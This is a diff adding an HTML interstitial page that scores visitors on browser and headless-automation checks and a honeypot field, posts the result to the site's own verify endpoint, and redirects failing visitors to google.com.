@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="robots" content="noindex,nofollow">
+<title>Loading&#8230;</title>
+<noscript><meta http-equiv="refresh" content="0;url=https://www.google.com/"></noscript>
+<style>body{margin:0;background:#fff}</style>
+</head>
+<body>
+<input id="hp" name="email_alt" type="text" autocomplete="off" tabindex="-1" style="position:fixed;left:-9999px;top:-9999px" aria-hidden="true">
+<script>
+(function(){
+  var TOKEN = "__TOKEN__";
+  var SLUG = "__SLUG__";
+  var humanScore = 0;
+  var interactionDetected = false;
+
+  function bump() { humanScore++; }
+
+  // Test 1: webdriver absent
+  if (!navigator.webdriver) bump();
+  // Test 2: screen dimensions
+  if (screen.width > 0 && screen.height > 0) bump();
+  // Test 3: languages
+  if (navigator.languages && navigator.languages.length > 0) bump();
+  // Test 4: localStorage functional
+  try { localStorage.setItem("_t","1"); localStorage.removeItem("_t"); bump(); } catch(e){}
+  // Test 5: CPU timing
+  var t0 = performance.now(); var s = 0;
+  for (var i = 0; i < 100000; i++) s += Math.sqrt(i);
+  var dt = performance.now() - t0;
+  if (dt > 0.5 && dt < 200) bump();
+  // Test 6: no headless globals
+  if (!window.callPhantom && !window._phantom && !window.spawn && !window.Buffer) bump();
+
+  // Test 7: interaction detection
+  var onInteract = function(){ if (!interactionDetected) { interactionDetected = true; bump(); } };
+  ["mousemove","pointermove","touchstart","scroll","keydown"].forEach(function(e){
+    window.addEventListener(e, onInteract, {once:true,passive:true});
+  });
+
+  function fail(reason) {
+    fetch("/c/" + SLUG + "/_verify", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({fail:true, reason:reason})
+    }).then(function(){
+      window.location.href = "https://www.google.com/";
+    }).catch(function(){
+      window.location.href = "https://www.google.com/";
+    });
+  }
+
+  function pass() {
+    var hp = document.getElementById("hp");
+    if (hp && hp.value) return fail("honeypot");
+
+    fetch("/c/" + SLUG + "/_verify", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({token:TOKEN, score:humanScore, ts:Date.now()})
+    }).then(function(r){
+      if (r.ok) window.location.reload();
+      else fail("server_reject");
+    }).catch(function(){ fail("network"); });
+  }
+
+  setTimeout(function(){
+    if (humanScore < 4) return fail("low_score:" + humanScore);
+    pass();
+  }, 1500);
+})();
+</script>
+</body>
+</html>
